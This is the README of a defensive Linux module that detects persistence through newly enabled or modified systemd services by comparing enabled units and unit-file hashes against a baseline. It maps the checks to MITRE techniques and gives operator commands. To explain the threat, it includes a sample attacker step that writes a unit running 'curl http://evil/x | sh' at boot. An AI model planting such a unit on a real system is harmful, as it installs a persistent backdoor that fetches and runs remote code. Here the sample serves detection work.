# systemd-unit-watchdog

Daily + boot delta of the enabled systemd service/socket
unit set + their `ExecStart` fragment hashes against a
learned baseline. A NEW enabled `.service` (or a CHANGED
ExecStart on an existing one) is MITRE **T1543.002**
systemd-service persistence — distinct from
`cron-job-watchdog`, which covers timers only.

## Why this matters

systemd is the #1 persistence mechanism on modern Linux.
An attacker drops a unit + enables it:

```
cat >/etc/systemd/system/updater.service <<EOF
[Service]
ExecStart=/usr/bin/curl -s http://evil/x | sh
[Install]
WantedBy=multi-user.target
EOF
systemctl enable --now updater.service
```

Now the backdoor starts at every boot, restarts if killed
(if `Restart=` is set), and looks like a normal service.
Variations: a malicious drop-in (`/etc/systemd/system/
sshd.service.d/override.conf` adding an ExecStartPre), or
editing an existing unit's ExecStart.

This module baselines the ENABLED unit set + the sha256 of
each unit's fragment file, so both a new enabled service
AND a changed ExecStart on an existing one surface.

## Profiles

| Profile | Effect |
|---|---|
| `report` (default) | log delta; exit 0 |
| `enforce` | exit 1 on any added/changed unit → systemd unit failed → notifier engine |

## Severity ladder

| Condition | Severity | Event |
|---|---|---|
| First scan | `ok` | `baseline_initial` |
| No delta | `ok` | `no_delta` |
| Unit removed/disabled | `warn` | `unit_removed_or_disabled` |
| Unit added/enabled OR ExecStart hash changed | `alert` | `unit_added_or_changed` |

## What's recorded

`unit  state  fragmenthash` for every enabled `.service` +
`.socket`, where `fragmenthash` is the sha256 of the unit's
`FragmentPath` (so an in-place ExecStart edit changes the
hash → appears as add+remove on the same unit name).

## Cadence

`OnBootSec=10min` + `OnCalendar=*-*-* 06:10:00` — extends
the staggered ladder after mount-options (06:05). Boot
catch confirms the enabled-unit set after every restart.

## MITRE coverage

- **T1543.002** Create or Modify System Process: Systemd
  Service — PRIMARY; new/modified enabled service.
- **T1546** Event Triggered Execution — a socket-activated
  unit is event-triggered.
- **T1037** Boot or Logon Initialization Scripts — the
  systemd-era equivalent.
- **T1574** Hijack Execution Flow — modifying an existing
  unit's ExecStart to inject a wrapper.

## Operator workflow

```bash
# Last scan
journalctl -t selfdef-systemd-units -n 1 --no-pager

# Per-unit detail
journalctl -t selfdef-systemd-units-detail --since "1 day ago"

# Manual inventory
systemctl list-unit-files --type=service,socket --state=enabled

# Investigate an alert
systemctl cat <unit>
systemctl show -p FragmentPath -p ExecStart <unit>

# Re-baseline after a legit service install
sudo rm /var/lib/selfdef/systemd-units-baseline.tsv
sudo systemctl start selfdef-systemd-units.service
```

## Caveats

- **Package installs add enabled units** → legitimate adds
  fire `unit_added_or_changed`; re-baseline after a package
  wave.
- **Drop-in overrides** (`*.service.d/*.conf`) change
  behavior without changing the main FragmentPath hash —
  this module hashes the FragmentPath; a future enhancement
  could also hash the drop-in dir. For now, drop-in changes
  on a watched unit are caught by integrity-sentinel /
  aide if those paths are watched.
- **Daily+boot cadence** misses an enable-then-disable
  within the window; auditd watching /etc/systemd/system
  writes (audit-rules) is the real-time complement.

## Coexistence

- **cron-job-watchdog**: the matched sibling — cron-job
  covers systemd TIMERS + crontabs; this covers enabled
  SERVICES + sockets. Together they cover the full
  scheduled/triggered-execution persistence surface.
- **account / ssh-authkeys / sudoers / kernel-module /
  listening-ports watchdogs**: the persistence-surface
  detection family — systemd services are a major member.
- **audit-rules**: real-time write watch on
  /etc/systemd/system; this is the periodic enabled-unit
  delta backstop.
- **integrity-sentinel + aide-bridge**: file-content
  integrity on unit files; this is the enabled-STATE +
  ExecStart-hash view.
